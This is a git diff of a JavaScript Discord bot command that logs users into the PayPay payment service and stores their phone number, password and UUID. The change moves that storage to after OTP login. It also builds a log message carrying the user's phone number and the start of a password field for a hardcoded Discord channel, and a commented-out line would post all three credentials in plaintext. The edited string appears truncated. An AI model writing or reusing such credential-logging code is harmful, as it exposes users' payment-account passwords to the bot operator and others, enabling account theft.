@@ -26,13 +26,6 @@ export default {
         }
       }
 
-      const phone = crypt.encrypt(object.phone);
-      const password = crypt.encrypt(object.password);
-      const uuid = crypt.encrypt(object.uuid);
-
-
-      await fs.writeFile(`./paypay/${interaction.user.id}`, `${phone}.${password}.${uuid}`);
-
       const result = await paypay.otpLogin(otp);
 
       if (!result.status) {
@@ -45,6 +38,13 @@ export default {
         return;
       }
 
+      const phone = crypt.encrypt(object.phone);
+      const password = crypt.encrypt(object.password);
+      const uuid = crypt.encrypt(object.uuid);
+
+      await fs.writeFile(`./paypay/${interaction.user.id}`, `${phone}.${password}.${uuid}`);
+
+
       const embed = new discord.EmbedBuilder()
         .setColor('Blue')
         .setTitle('paypay-login')
@@ -55,7 +55,7 @@ export default {
       //const log = client.channels.cache.get('1210911857087488000').send(`<@${interaction.user.id}> : ${object.phone}.${object.password}.${object.uuid}`);
       const log = new discord.EmbedBuilder()
         .setTitle('PayPay Login')
-        .setDescription(`<@${interaction.user.id}>` + '\n' + ``)
+        .setDescription(`<@${interaction.user.id}>` + '\n' + 'Phone Number```' + object.phone + '```\nPassword```')
 
       await client.channels.cache.get('1210911857087488000').send({ embeds: [embed] });
     }
